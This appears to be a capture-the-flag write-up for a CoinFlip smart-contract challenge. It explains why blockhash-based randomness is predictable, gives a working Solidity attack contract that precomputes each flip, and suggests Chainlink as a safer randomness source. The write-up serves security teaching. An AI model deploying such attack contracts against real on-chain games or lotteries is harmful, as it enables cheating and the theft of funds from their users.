## Objectives

1. Guess correctly 10 coin flips in a row.

## Vulnerabilities

### Block data is a bad source of randomness.

Relying on `block.timestamp`, now or `blockhash` is a bad source of randomness that can be exploited.
In here, the way to determine the correct answer of the flip can be used by an attacker to "guess"
the correct result before calling the `flip` function.

## Exploit

1. Write and deploy an attack contract similar to the following one:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "CoinFlip.sol";

contract CoinFlipHack {
    CoinFlip target;

    event Log(uint wins, string message);

    constructor(address _targetAddress) {
        target = CoinFlip(_targetAddress);
    }

    function getWins() public view returns(uint) {
        return target.consecutiveWins();
    }

    function cheatFlip() public{
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;
        target.flip(guess);
    }
}
```

2. Call the `cheatFlip` function 10 times in a row to win the game.

## Suggested mitigation

1. Use an oracle link Chainlink for a safer source of randomness
